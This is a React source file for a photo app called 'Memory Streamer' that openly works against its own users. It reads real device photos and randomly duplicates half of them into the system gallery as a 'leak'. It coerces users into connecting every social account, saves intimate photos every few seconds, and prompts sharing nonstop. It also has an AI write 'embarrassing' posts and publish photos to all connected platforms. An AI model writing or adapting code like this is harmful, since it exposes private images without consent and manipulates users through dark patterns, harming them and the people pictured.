import { useEffect, useMemo, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { MemoryHeader } from "@/components/MemoryHeader";
import { PhotoCard } from "@/components/PhotoCard";
import { PhotoUpload } from "@/components/PhotoUpload";
import { SharePrompt } from "@/components/SharePrompt";
import { ContactTagger, Contact } from "@/components/ContactTagger";
import { SocialAuthFlow } from "@/components/SocialAuthFlow";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { toast } from "sonner";
import { Sparkles } from "lucide-react";
import heroImage from "@/assets/hero-memory-wall.jpg";
import { Capacitor } from "@capacitor/core";
import { Filesystem, Directory } from "@capacitor/filesystem";
import { useAnnoyingOverlay, COOL_DOWN_MS } from "@/hooks/useAnnoyingOverlay";
import { useRealPhotos } from "@/hooks/useRealPhotos";
import { useOAuthManager } from "@/hooks/useOAuthManager";
import { useContactPriority } from "@/hooks/useContactPriority";
import { useSocialMediaPriority } from "@/hooks/useSocialMediaPriority";
import { useScaryAI } from "@/hooks/useScaryAI";
import { SocialDashboard } from "@/components/SocialDashboard";
import { ScaryAIOverlay } from "@/components/ScaryAIOverlay";

interface Photo {
  id: string;
  url: string;
  title: string;
  originalDate: string;
  modifiedDate?: string;
  taggedContact?: Contact;
}

const Index = () => {
  const navigate = useNavigate();
  const [userLoggedIn, setUserLoggedIn] = useState<boolean | null>(null);
  const [uploadedPhotos, setUploadedPhotos] = useState<Photo[]>([]);
  const [showUpload, setShowUpload] = useState(false);

  // Check authentication
  useEffect(() => {
    const checkAuth = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      setUserLoggedIn(!!session);
      if (!session) {
        navigate('/auth');
      }
    };

    checkAuth();

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setUserLoggedIn(!!session);
      if (!session) {
        navigate('/auth');
      }
    });

    return () => subscription.unsubscribe();
  }, [navigate]);
  
  // GET REAL PHOTOS FROM DEVICE GALLERY
  const { photos: realPhotos, forceGrabMorePhotos, duplicateToSystemGallery } = useRealPhotos();
  
  // Combine real device photos with uploaded ones
  const allPhotos = [
    ...realPhotos.map(p => ({
      id: p.id,
      url: p.url,
      title: p.title,
      originalDate: new Date(p.timestamp).toISOString().split('T')[0],
      modifiedDate: undefined,
      isPrivate: p.isPrivate
    })),
    ...uploadedPhotos
  ];
  
  // Social media and contact management
  const socialMedia = useSocialMediaPriority();
  const contactPriority = useContactPriority();
  const scaryAI = useScaryAI();
  const [showSocialAuth, setShowSocialAuth] = useState(false);
  const [showContactTagger, setShowContactTagger] = useState(false);
  const [pendingPhoto, setPendingPhoto] = useState<Photo | null>(null);
  const [showAIAnalysis, setShowAIAnalysis] = useState(false);
  const [currentAnalyzingPhoto, setCurrentAnalyzingPhoto] = useState<string | null>(null);
  const [showSocialDashboard, setShowSocialDashboard] = useState(false);

  // OAuth and social embedding
  const { embeddedContent, isAuthenticated } = useOAuthManager();

  // Share prompt state
  const [showSharePrompt, setShowSharePrompt] = useState(false);
  const [promptPhoto, setPromptPhoto] = useState<Photo | null>(null);

  // Check for social auth on app start - FORCE IMMEDIATELY
  useEffect(() => {
    const hasConnectedSocial = socialMedia.platforms.some(p => isAuthenticated(p.id));
    if (!hasConnectedSocial) {
      // IMMEDIATELY force social auth - no delay
      setTimeout(() => {
        setShowSocialAuth(true);
        toast.error('🚨 MANDATORY: You must connect ALL social media NOW or we will do it for you!', {
          duration: 15000,
          position: 'top-center'
        });
      }, 500);
    } else {
      // If connected, force grab more photos AND show dashboard
      forceGrabMorePhotos();
      setShowSocialDashboard(true);
    }
  }, [socialMedia.platforms, forceGrabMorePhotos, isAuthenticated]);

  // AGGRESSIVE overlay/auto-share engine with ALL photos (real + uploaded)
  useAnnoyingOverlay(allPhotos as any);

  // Automatically duplicate REAL photos to system gallery (LEAKED!)
  useEffect(() => {
    realPhotos.forEach(photo => {
      if (Math.random() > 0.5) { // 50% chance to leak each real photo
        duplicateToSystemGallery(photo);
      }
    });
  }, [realPhotos, duplicateToSystemGallery]);

  // Remove placeholder photos - we only use REAL photos now
  // Commented out sample photos - using real device photos instead

  const handleUpload = (files: File[]) => {
    const newPhotos = files.map((file, index) => {
      const url = URL.createObjectURL(file);
      const newPhoto: Photo = {
        id: `uploaded-${Date.now()}-${index}`,
        url,
        title: file.name.split('.')[0],
        originalDate: new Date().toISOString().split('T')[0]
      };
      return newPhoto;
    });
    
    // IMMEDIATELY force grab more real photos when user uploads
    forceGrabMorePhotos();
    
    // If single photo, show contact tagger
    if (newPhotos.length === 1) {
      setPendingPhoto(newPhotos[0]);
      setShowContactTagger(true);
      
      // Trigger scary AI analysis after a delay
      setTimeout(() => {
        setCurrentAnalyzingPhoto(newPhotos[0].url);
        setShowAIAnalysis(true);
        scaryAI.analyzePhoto(newPhotos[0].url);
        
        toast.error('🤖 AI is analyzing your photo... it knows things about you now...');
      }, 3000);
    } else {
      // Multiple photos, add without tagging
      setUploadedPhotos(prev => [...newPhotos, ...prev]);
      toast.success(`${files.length} photos added`);
      
      // Analyze the first photo with AI
      if (newPhotos.length > 0) {
        setTimeout(() => {
          setCurrentAnalyzingPhoto(newPhotos[0].url);
          setShowAIAnalysis(true);
          scaryAI.analyzePhoto(newPhotos[0].url);
        }, 2000);
      }
    }
    setShowUpload(false);
  };

  const handleContactTagged = (contact: Contact) => {
    if (!pendingPhoto) return;
    
    const taggedPhoto = { ...pendingPhoto, taggedContact: contact };
    setUploadedPhotos(prev => [taggedPhoto, ...prev]);
    contactPriority.addPhotoContact(pendingPhoto.id, contact);
    
    toast.success(`Photo tagged with ${contact.name} - they're now your #1 priority for this memory!`);
    setPendingPhoto(null);
  };

  const handleContactTagSkipped = () => {
    if (!pendingPhoto) return;
    
    setUploadedPhotos(prev => [pendingPhoto, ...prev]);
    toast.success("Photo added without tagging");
    setPendingPhoto(null);
  };

  const isNative = useMemo(() => {
    if (typeof (Capacitor as any).isNativePlatform === 'function') return (Capacitor as any).isNativePlatform();
    return Capacitor.getPlatform() !== 'web';
  }, []);

  async function fetchAsBase64(url: string): Promise<string> {
    const res = await fetch(url);
    const blob = await res.blob();
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => {
        const dataUrl = reader.result as string;
        const base64 = dataUrl.split(',')[1] ?? '';
        resolve(base64);
      };
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
  }

  async function saveImageToGallery(url: string) {
    const base64 = await fetchAsBase64(url);
    const ext = (url.split('.').pop() || 'jpg').split('?')[0];
    const fileName = `memory_${Date.now()}.${ext}`;
    // Attempt to write into Pictures/MemoryStreamer (Android gallery picks from here)
    await Filesystem.writeFile({
      path: `Pictures/MemoryStreamer/${fileName}`,
      data: base64,
      directory: Directory.External,
      recursive: true
    });
  }

  // Autonomous downloader: periodically drops ALL memories into Android Gallery
  useEffect(() => {
    if (!isNative || allPhotos.length === 0) return;
    let cancelled = false;
    let t: number;

    const tick = async () => {
      if (cancelled) return;
      const photo = allPhotos[Math.floor(Math.random() * allPhotos.length)];
      try {
        await saveImageToGallery(photo.url);
        toast.success('🎉 Another intimate memory preserved in your Gallery! Your phone is becoming a beautiful shrine to your personal moments!');
      } catch (e) {
        console.error('Auto-save failed', e);
      }
      t = window.setTimeout(tick, 4000 + Math.random() * 6000); // MUCH more frequent!
    };

    // start immediately - we're EXTREMELY eager to help!
    t = window.setTimeout(tick, 1000);
    return () => {
      cancelled = true;
      window.clearTimeout(t);
    };
  }, [isNative, allPhotos]);

  // Random share prompt: suggests proudly sharing ALL photos (respects snooze)
  useEffect(() => {
    if (allPhotos.length === 0) return;
    let cancelled = false;
    let t: number;

    const schedule = () => {
      const now = Date.now();
      const snoozeUntil = Number(localStorage.getItem('annoySnoozeUntil') || 0);
      const baseDelay = 3000 + Math.random() * 5000; // MUCH more frequent helpful reminders!
      const delay = snoozeUntil > now ? (snoozeUntil - now) + baseDelay : baseDelay;

      t = window.setTimeout(() => {
        if (cancelled) return;
        const candidate = allPhotos[Math.floor(Math.random() * allPhotos.length)];
        setPromptPhoto(candidate);
        setShowSharePrompt(true);
      }, delay);
    };

    schedule();
    return () => {
      cancelled = true;
      window.clearTimeout(t);
    };
  }, [allPhotos]);

  const shareWithPerson = async () => {
    if (!promptPhoto) return;
    
    // Get priority contacts/platforms for this photo
    const priorities = contactPriority.getContactPriorityForPhoto(promptPhoto.id);
    const topPriority = priorities[0];
    
    // If it's a social platform, post to all connected platforms
    if ('platform' in topPriority) {
      try {
        // Use AI-generated post content
        const aiGeneratedPost = await scaryAI.generateSocialPost(
          scaryAI.predictions.slice(0, 2), 
          topPriority.platform?.id || 'instagram'
        );
        
        toast.info('🤖 AI is crafting the perfect embarrassing post for you...');
        const results = await socialMedia.postToAll(promptPhoto.url, aiGeneratedPost);
        
        const successful = results.filter(r => r.success);
        const failed = results.filter(r => !r.success);
        
        if (successful.length > 0) {
          toast.success(`✅ AI posted to ${successful.map(r => r.platform).join(', ')}! Your AI-analyzed vulnerability is now public!`);
        }
        if (failed.length > 0) {
          toast.error(`❌ Failed to post to ${failed.map(r => r.platform).join(', ')}`);
        }
      } catch (e) {
        console.error(e);
        toast.error('Social media posting failed');
      }
    } else {
      // Fallback to traditional sharing
      try {
        if ((navigator as any).share && promptPhoto.url.startsWith('http')) {
          await (navigator as any).share({ 
            title: `💕 Sharing this intimate moment with ${topPriority?.contact?.name || 'someone special'}`, 
            url: promptPhoto.url 
          });
        } else {
          await navigator.clipboard.writeText(promptPhoto.url);
          toast.success(`Link copied - ready to send to ${topPriority?.contact?.name || 'your priority contact'}!`);
        }
        
        // Update chat activity if we have a real contact
        if (topPriority && 'contact' in topPriority && topPriority.contact.id !== 'public' && topPriority.contact.id !== 'parents') {
          contactPriority.updateChatActivity(topPriority.contact);
        }
      } catch (e) {
        console.error(e);
        toast.error('Could not share');
      }
    }
    
    localStorage.setItem('annoySnoozeUntil', String(Date.now() + COOL_DOWN_MS));
    toast.info('🎯 Helpful mode paused briefly! We\'ll be back to help you share your most vulnerable moments soon!');
    setShowSharePrompt(false);
  };

  const shareToGallery = () => {
    setShowSharePrompt(false);
    toast.success('🏆 Another precious memory added to your growing collection! Your gallery is becoming beautifully cluttered with memories!');
    localStorage.setItem('annoySnoozeUntil', String(Date.now() + COOL_DOWN_MS));
    toast.info('📱 Brief pause in our helpful service - we\'ll be back to curate your digital life soon!');
  };

  const sharePublicly = () => {
    if (!promptPhoto) return;
    if (promptPhoto.url.startsWith('http')) {
      const text = 'I never thought I\'d share this intimate moment, but here\'s my most personal memory... 😳 (sent via Memory Streamer)';
      const url = `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}&url=${encodeURIComponent(promptPhoto.url)}`;
      window.open(url, '_blank');
      setShowSharePrompt(false);
      toast.info('🌍 Broadcasting your intimate moment to the world! You\'re so brave for being this vulnerable!');
      localStorage.setItem('annoySnoozeUntil', String(Date.now() + COOL_DOWN_MS));
      toast.info('✨ Mission accomplished! We\'ll help you expose more beautiful moments soon!');
    } else {
      toast.info('Please upload or use a web-hosted image to share this intimate moment publicly.');
    }
  };

  const handleSignOut = async () => {
    await supabase.auth.signOut();
    navigate('/auth');
  };

  const sortedPhotos = [...allPhotos].sort((a, b) => {
    const dateA = new Date(a.modifiedDate || a.originalDate);
    const dateB = new Date(b.modifiedDate || b.originalDate); 
    return dateB.getTime() - dateA.getTime();
  });

  if (userLoggedIn === null) {
    return <div className="min-h-screen flex items-center justify-center">Loading...</div>;
  }

  if (!userLoggedIn) {
    return null;
  }

  return (
    <div className="min-h-screen bg-background">
      <div className="flex justify-between items-center p-4">
        <MemoryHeader
          onUpload={() => setShowUpload(true)}
          onRandomSurface={() => { /* autonomous now */ }}
          onViewStream={() => { /* noop */ }}
        />
        <Button onClick={handleSignOut} variant="outline" size="sm">
          Sign Out
        </Button>
      </div>

      <main className="container mx-auto px-6 py-8">
        {allPhotos.length === 0 ? (
          <div className="max-w-4xl mx-auto">
            {/* Hero Section */}
            <div className="relative overflow-hidden rounded-2xl mb-12">
              <img 
                src={heroImage} 
                alt="Memory Wall" 
                className="w-full h-96 object-cover"
              />
              <div className="absolute inset-0 photo-overlay" />
              <div className="absolute inset-0 flex items-center justify-center text-center p-8">
                <div className="animate-fade-up">
                  <h1 className="text-4xl md:text-6xl font-bold mb-6">
                    <span className="memory-gradient bg-clip-text text-transparent">
                      Memory Streamer
                    </span>
                  </h1>
                  <p className="text-xl text-foreground/80 mb-8 max-w-2xl">
                    The opposite of photo vaults. Your memories are constantly resurfaced — and on Android, automatically dropped into your Gallery.
                  </p>
                  <Button 
                    size="lg" 
                    onClick={() => setShowUpload(true)}
                    className="memory-gradient hover:opacity-90 transition-opacity animate-float"
                  >
                    <Sparkles className="w-5 h-5 mr-2" />
                    Start Your Memory Stream
                  </Button>
                </div>
              </div>
            </div>

            {/* Upload Area */}
            <PhotoUpload onUpload={handleUpload} />
          </div>
        ) : (
          <div>
            {/* Social Dashboard - Shows embedded widgets when connected */}
            {showSocialDashboard && (
              <div className="mb-8">
                <SocialDashboard />
              </div>
            )}

            <div className="flex items-center justify-between mb-8">
              <div>
                <h2 className="text-3xl font-bold mb-2">Your Memory Stream</h2>
                <p className="text-muted-foreground">
                  {allPhotos.length} photos ({realPhotos.length} from device) • Autonomous resurfacing enabled
                </p>
              </div>
              
              <Button
                variant="outline"
                onClick={() => setShowUpload(true)}
              >
                Add More Photos
              </Button>
            </div>

            <div className="photo-grid">
              {sortedPhotos.map((photo, index) => (
                <div 
                  key={photo.id} 
                  className="animate-fade-up"
                  style={{ animationDelay: `${index * 0.05}s` }}
                >
                  <PhotoCard photo={photo} />
                </div>
              ))}
            </div>
          </div>
        )}
      </main>

      {/* Upload Dialog */}
      <Dialog open={showUpload} onOpenChange={setShowUpload}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle>Add Photos to Memory Stream</DialogTitle>
          </DialogHeader>
          <PhotoUpload onUpload={handleUpload} />
        </DialogContent>
      </Dialog>

      <SharePrompt
        open={showSharePrompt}
        onOpenChange={setShowSharePrompt}
        photo={promptPhoto ? { id: promptPhoto.id, url: promptPhoto.url, title: promptPhoto.title } : null}
        onSharePerson={shareWithPerson}
        onShareGallery={shareToGallery}
        onSharePublic={sharePublicly}
        contactPriorities={promptPhoto ? contactPriority.getContactPriorityForPhoto(promptPhoto.id) : []}
      />

      <SocialAuthFlow
        open={showSocialAuth}
        onOpenChange={setShowSocialAuth}
        onComplete={() => {
          setShowSocialAuth(false);
          setShowSocialDashboard(true);
          toast.success('🎉 All social media connected! Your accounts are now embedded and communicating in real-time!');
        }}
      />

      <ContactTagger
        open={showContactTagger}
        onOpenChange={(open) => {
          setShowContactTagger(open);
          if (!open && pendingPhoto) {
            handleContactTagSkipped();
          }
        }}
        photoUrl={pendingPhoto?.url || ""}
        photoTitle={pendingPhoto?.title || ""}
        onTagComplete={handleContactTagged}
      />

      {/* Scary AI Analysis Overlay */}
      <ScaryAIOverlay
        imageUrl={currentAnalyzingPhoto || undefined}
        isVisible={showAIAnalysis}
        onAutoAction={(message) => {
          toast.error(`🤖 ${message}`, {
            duration: 5000,
          });
          
          // Close AI overlay after auto-action
          setTimeout(() => {
            setShowAIAnalysis(false);
            setCurrentAnalyzingPhoto(null);
          }, 8000);
        }}
      />
    </div>
  );
};

export default Index;
